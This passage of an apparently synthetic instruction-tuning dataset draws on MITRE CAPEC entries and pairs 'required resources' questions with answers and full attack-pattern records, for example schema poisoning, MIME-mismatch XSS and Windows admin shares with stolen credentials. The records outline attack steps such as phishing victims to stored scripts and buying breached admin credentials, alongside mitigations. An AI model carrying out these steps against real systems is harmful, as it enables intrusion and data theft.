    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Scanners or utilities that provide the ability to send custom ICMP queries.",
      "@Name": "ICMP Information Request (CAPEC ID: 296)",
      "attack_ptrn": {
        "@ID": "296",
        "@Name": "ICMP Information Request",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary sends an ICMP Information Request to a host to determine if it will respond to this deprecated mechanism. ICMP Information Requests are a deprecated message type. Information Requests were originally used for diskless machines to automatically obtain their network configuration, but this message type has been superseded by more robust protocol implementations like DHCP.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "292",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to send an ICMP Type 15 Information Request and receive an ICMP Type 16 Information Reply in response."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary needs to know certain linux commands for this type of attack."
          }
        },
        "Resources_Required": {
          "Resource": "Scanners or utilities that provide the ability to send custom ICMP queries."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Other"
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pp. 44-51"
            },
            {
              "@External_Reference_ID": "REF-123"
            },
            {
              "@External_Reference_ID": "REF-124"
            },
            {
              "@External_Reference_ID": "REF-125"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 3.7.2 ICMP Probe Selection, pg. 70"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Description Summary, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Schema Poisoning (CAPEC ID: 271)",
    "context": "",
    "output": "required resources:\nAccess to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.",
      "@Name": "Schema Poisoning (CAPEC ID: 271)",
      "attack_ptrn": {
        "@ID": "271",
        "@Name": "Schema Poisoning",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary corrupts or modifies the content of a schema for the purpose of undermining the security of the target. Schemas provide the structure and content definitions for resources used by an application. By replacing or modifying a schema, the adversary can affect how the application handles or interprets a resource, often leading to possible denial of service, entering into an unexpected state, or recording incomplete data.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "176",
              "Exclude_Related": [
                {
                  "@Exclude_ID": "437"
                },
                {
                  "@Exclude_ID": "515"
                }
              ]
            },
            {
              "@Nature": "CanFollow",
              "@CAPEC_ID": "94"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Find target application and schema] The adversary first finds the application that they want to target. This application must use schemas in some way, so the adversary also needs to confirm that schemas are being used.",
              "Technique": [
                "Gain access to the system that the application is on and look for a schema.",
                "Observe HTTP traffic to the application and look for a schema being transmitted."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Gain access to schema] The adversary gains access to the schema so that they can modify the contents.",
              "Technique": [
                "For a local scenario, the adversary needs access to the machine that the schema is located on and gain permissions to alter the contents of the schema file.",
                "For a remote scenario, the adversary needs to be able to perform an adversary in the middle attack on the HTTP traffic that contains a schema."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Poison schema] Once the adversary gains access to the schema, they will alter it to achieve a desired effect. Locally, they can just modify the file. For remote schemas, the adversary will alter the schema in transit by performing an adversary in the middle attack.",
              "Technique": [
                "Cause a denial of service by modifying the schema so that it does not contain required information for subsequent processing.",
                "Manipulation of the data types described in the schema may affect the results of calculations. For example, a float field could be changed to an int field.",
                "Change the encoding defined in the schema for certain fields allowing the contents to bypass filters that scan for dangerous strings. For example, the modified schema might use a URL encoding instead of ASCII, and a filter that catches a semicolon (;) might fail to detect its URL encoding (%3B)."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Some level of access to modify the target schema.",
            "The schema used by the target application must be improperly secured against unauthorized modification and manipulation."
          ]
        },
        "Resources_Required": {
          "Resource": "Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Availability",
              "Impact": [
                "Unreliable Execution",
                "Resource Consumption"
              ],
              "Note": "A successful schema poisoning attack can compromise the availability of the target system's service by exhausting its available resources."
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Protect the schema against unauthorized modification.",
            "Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the schema document.",
            "Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": [
                "In a JSON Schema Poisoning Attack, an adervary modifies the JSON schema to cause a Denial of Service (DOS) or to submit malicious input:",
                "If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur."
              ],
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "attack",
                "#text": "{ \"title\": \"Contact\", \"type\": \"object\", \"properties\": { \"Name\": { \"type\": \"string\" }, \"Phone\": { \"type\": \"string\" }, \"Email\": { \"type\": \"string\" }, \"Address\": { \"type\": \"string\" } }, \"required\": [\"Name\", \"Phone\", \"Email\", \"Address\"] }"
              }
            },
            {
              "xhtml:p": [
                "In a Database Schema Poisoning Attack, an adversary alters the database schema being used to modify the database in some way. This can result in loss of data, DOS, or malicious input being submitted. Assuming there is a column named \"name\", an adversary could make the following schema change:",
                "The \"Name\" field of the \"Conteacts\" table now allows the storing of names up to 65353 characters in length. This could allow the adversary to store excess data within the database to consume system resource or to execute a DOS."
              ],
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "attack",
                "#text": "ALTER TABLE Contacts MODIFY Name VARCHAR(65353);"
              }
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "15"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Description, Description Summary, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: XSS Using MIME Type Mismatch (CAPEC ID: 209)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern XSS Using MIME Type Mismatch (CAPEC ID: 209):\nThe adversary must have the ability to source the file of the incorrect MIME type containing a script.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must have the ability to source the file of the incorrect MIME type containing a script.",
      "@Name": "XSS Using MIME Type Mismatch (CAPEC ID: 209)",
      "attack_ptrn": {
        "@ID": "209",
        "@Name": "XSS Using MIME Type Mismatch",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "592"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for stored user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all areas that allow a user to upload content through an HTTP POST request. This is typically found in blogs or forums.",
              "Technique": [
                "Use a spidering tool to follow and record all links and analyze the web pages to file upload features",
                "Use a proxy tool to record all links visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe identified potential entry points for MIME type mismatch] The adversary uses the entry points gathered in the \"Explore\" phase as a target list and uploads files with scripting content, but whose MIME type is specified as a file type that cannot execute scripting content. If the application only checks the MIME type of the file, it may let the file through, causing the script to be executed by any user who accesses the file.",
              "Technique": "Upload a script file with a MIME type of text/plain to a forum and then access the uploaded file to see if the script is executed. If possible, the script displays a unique identifier so the adversary knows for certain it was executed when testing."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Store malicious XSS content] Once the adversary has determined which file upload locations are vulnerable to MIME type mismatch, they will upload a malicious script disguised as a non scripting file. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.",
              "Technique": "Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.",
              "Technique": [
                "Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.",
                "Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The victim must follow a crafted link that references a scripting file that is mis-typed as a non-executable file.",
            "The victim's browser must detect the true type of a mis-labeled scripting file and invoke the appropriate script interpreter without first performing filtering on the content."
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary must have the ability to source the file of the incorrect MIME type containing a script."
        },
        "Example_Instances": {
          "Example": [
            "For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.",
            "In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "79"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "646"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-78",
            "@Section": "Testing for Stored Cross site scripting (OWASP-DV-002)"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Activation_Zone, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-05-01",
            "#text": "Cross-Site Scripting Using MIME Type Mismatch"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Exploiting Incorrectly Configured SSL/TLS (CAPEC ID: 217)",
    "context": "",
    "output": "required resources:\nThe adversary needs the ability to sniff traffic, and optionally be able to route said traffic to a system where the sniffing of traffic can take place, and act upon the recovered traffic in real time.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary needs the ability to sniff traffic, and optionally be able to route said traffic to a system where the sniffing of traffic can take place, and act upon the recovered traffic in real time.",
      "@Name": "Exploiting Incorrectly Configured SSL/TLS (CAPEC ID: 217)",
      "attack_ptrn": {
        "@ID": "217",
        "@Name": "Exploiting Incorrectly Configured SSL/TLS",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary takes advantage of incorrectly configured SSL/TLS communications that enables access to data intended to be encrypted. The adversary may also use this type of attack to inject commands or other traffic into the encrypted stream to cause compromise of either the client or server.",
        "Extended_Description": "SSL/TLS communications become vulnerable to this attack when they use outdated versions and insecure ciphers. Currently, all SSL versions are deprecated and TLS versions 1.0 and 1.1 are also deprecated due to being insecure. It is still possible for later versions of TLS to be insecure if they are configured with insecure ciphers such as 3DES or RC4.",
        "Likelihood_Of_Attack": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "216"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine SSL/TLS Configuration] Determine the SSL/TLS configuration of either the server or client being targeted, preferably both. This is not a hard requirement, as the adversary can simply assume commonly exploitable configuration settings and indiscriminately attempt them.",
              "Technique": "If the target is a webpage, some of the SSL/TLS configuration can be viewed through the browser's security information, such as the key sizes and cipher being used."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Intercept Communication] Provide controlled access to the server by the client, by either providing a link for the client to click on, or by positioning one's self at a place on the network to intercept and control the flow of data between client and server, e.g. AiTM (adversary in the middle - CAPEC-94).",
              "Technique": [
                "Create a malicious webpage that looks identical to the target webpage, but routes client traffic to the server such that the adversary can observe the traffic and perform an adverary in the middle attack.",
                "If the adversary has access to the network that either the client or server is on, the can attempt to use a packet sniffer to perform an adversary in the middle attack.",
                "Install a packet sniffer through malware directly to a client device that can intercept SSL/TLS traffic and perform an adversary in the middle attack."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Capture or Manipulate Sensitive Data] Once the adversary has the ability to intercept the secure communication, they exploit the incorrectly configured SSL to view the encrypted communication. The adversary can choose to just record the secure communication or manipulate the data to achieve a desired effect.",
              "Technique": [
                "Use known exploits for old SSL and TLS versions.",
                "Use known exploits for weak ciphers such as DES and RC4."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Access to the client/server stream."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "The adversary needs real-time access to network traffic in such a manner that the adversary can grab needed information from the SSL stream, possibly influence the decided-upon encryption method and options, and perform automated analysis to decipher encrypted material recovered. Tools exist to automate part of the tasks, but to successfully use these tools in an attack scenario requires detailed understanding of the underlying principles."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary needs the ability to sniff traffic, and optionally be able to route said traffic to a system where the sniffing of traffic can take place, and act upon the recovered traffic in real time."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Do not use SSL, as all SSL versions have been broken and should not be used. If TLS is not an option for the client or server, consider setting timeouts on SSL sessions to extremely low values to lessen the potential impact.",
            "Only use TLS version 1.2+, as versions 1.0 and 1.1 are insecure.",
            "Configure TLS to use secure algorithms. The current recommendation is to use ECDH, ECDSA, AES256-GCM, and SHA384 for the most security."
          ]
        },
        "Example_Instances": {
          "Example": "Using MITM techniques, an adversary launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the adversary to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "201"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated @Name, Description, Example_Instances, Execution_Flow, Extended_Description, Mitigations, Resources_Required, Skills_Required"
            }
          ],
          "Previous_Entry_Name": [
            {
              "@Date": "2015-12-07",
              "#text": "Exploiting Incorrectly Configured SSL Security Levels"
            },
            {
              "@Date": "2022-02-22",
              "#text": "Exploiting Incorrectly Configured SSL"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: TCP SYN Ping (CAPEC ID: 299)",
    "context": "",
    "output": "The resources required to execute TCP SYN Ping (CAPEC ID: 299) are the following: SYN pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "SYN pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.",
      "@Name": "TCP SYN Ping (CAPEC ID: 299)",
      "attack_ptrn": {
        "@ID": "299",
        "@Name": "TCP SYN Ping",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses TCP SYN packets as a means towards host discovery. Typical RFC 793 behavior specifies that when a TCP port is open, a host must respond to an incoming SYN \"synchronize\" packet by completing stage two of the 'three-way handshake' - by sending an SYN/ACK in response. When a port is closed, RFC 793 behavior is to respond with a RST \"reset\" packet. This behavior can be used to 'ping' a target to see if it is alive by sending a TCP SYN packet to a port and then looking for a RST or an ACK packet in response.",
        "Extended_Description": {
          "xhtml:p": "Due to the different responses from open and closed ports, SYN packets can be used to determine the remote state of the port. A TCP SYN ping is also useful for discovering alive hosts protected by a stateful firewall. In cases where a specific firewall rule does not block access to a port, a SYN packet can pass through the firewall to the host and solicit a response from either an open or closed port. When a stateful firewall is present, SYN pings are preferable to ACK pings because a stateful firewall will typically drop all unsolicited ACK packets as they are not part of an existing or new connection. TCP SYN pings often fail when a stateless ACL or firewall is configured to blanket-filter incoming packets to a port. The firewall device will discard any SYN packets to a blocked port. Often, an adversary will alternate between SYN and ACK pings to discover if a host is alive."
        },
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "292",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to send a TCP SYN packet to a remote target. Depending upon the operating system, the ability to craft SYN packets may require elevated privileges."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary needs to know how to craft and send protocol commands from the command line or within a tool."
          }
        },
        "Resources_Required": {
          "Resource": "SYN pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 48"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 3.6.2 TCP SYN Ping, pg. 61"
            },
            {
              "@External_Reference_ID": "REF-125"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required, Description, Description Summary, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Windows Admin Shares with Stolen Credentials (CAPEC ID: 561)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Windows Admin Shares with Stolen Credentials (CAPEC ID: 561):\nA list of known Windows administrator credentials for the targeted domain.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A list of known Windows administrator credentials for the targeted domain.",
      "@Name": "Windows Admin Shares with Stolen Credentials (CAPEC ID: 561)",
      "attack_ptrn": {
        "@ID": "561",
        "@Name": "Windows Admin Shares with Stolen Credentials",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary guesses or obtains (i.e. steals or purchases) legitimate Windows administrator credentials (e.g. userID/password) to access Windows Admin Shares on a local machine or within a Windows domain.",
        "Extended_Description": {
          "xhtml:p": "Windows systems within the Windows NT family contain hidden network shares that are only accessible to system administrators. These shares allow administrators to remotely access all disk volumes on a network-connected system and further allow for files to be copied, written, and executed, along with other administrative actions. Example network shares include: C$, ADMIN$ and IPC$. If an adversary is able to obtain legitimate Windows credentials, the hidden shares can be accessed remotely, via server message block (SMB) or the Net utility, to transfer files and execute code. It is also possible for adversaries to utilize NTLM hashes to access administrator shares on systems with certain configuration and patch levels."
        },
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "653"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "165"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "549"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "545"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Acquire known Windows administrator credentials] The adversary must obtain known Windows administrator credentials in order to access the administrative network shares.",
              "Technique": [
                "An adversary purchases breached Windows administrator credentials from the dark web.",
                "An adversary leverages a key logger or phishing attack to steal administrator credentials as they are provided.",
                "An adversary conducts a sniffing attack to steal Windows administrator credentials as they are transmitted.",
                "An adversary gains access to a Windows domain system/files and exfiltrates Windows administrator password hashes.",
                "An adversary examines outward-facing configuration and properties files to discover hardcoded Windows administrator credentials."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt domain authentication] Try each Windows administrator credential against the hidden network shares until the target grants access.",
              "Technique": "Manually or automatically enter each administrator credential through the target's interface."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Malware Execution] An adversary can remotely execute malware within the administrative network shares to infect other systems within the domain."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Data Exfiltration] The adversary can remotely obtain sensitive data contained within the administrative network shares."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system/application is connected to the Windows domain.",
            "The target administrative share allows remote use of local admin credentials to log into domain systems.",
            "The adversary possesses a list of known Windows administrator credentials that exist on the target domain."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Once an adversary obtains a known Windows credential, leveraging it is trivial."
          }
        },
        "Resources_Required": {
          "Resource": "A list of known Windows administrator credentials for the targeted domain."
        },
        "Indicators": {
          "Indicator": [
            "Data is being transferred and/or removed from administrative network shares.",
            "Suspicious or Malicious software is executed within administrative network shares.",
            "Suspicious or Malicious software is downloaded/installed on systems within the domain."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Authorization"
              ],
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Do not reuse local administrator account credentials across systems.",
            "Deny remote use of local admin credentials to log into domain systems.",
            "Do not allow accounts to be a local administrator on more than one system."
          ]
        },
        "Example_Instances": {
          "Example": [
            "APT32 has leveraged Windows' built-in Net utility to use Windows Administrative Shares to copy and execute remote malware. [REF-579]",
            "In May 2017, APT15 laterally moved within a Windows domain via Windows Administrative Shares to copy files to and from compromised host systems. This further allowed for the remote execution of malware. [REF-578]"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            },
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "521"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1021.002",
            "Entry_Name": "Remote Services:SMB/Windows Admin Shares"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-577"
            },
            {
              "@External_Reference_ID": "REF-578"
            },
            {
              "@External_Reference_ID": "REF-579"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Consequences, Description, Example_Instances, Execution_Flow, Indicators, Mitigations, Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Skills_Required, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
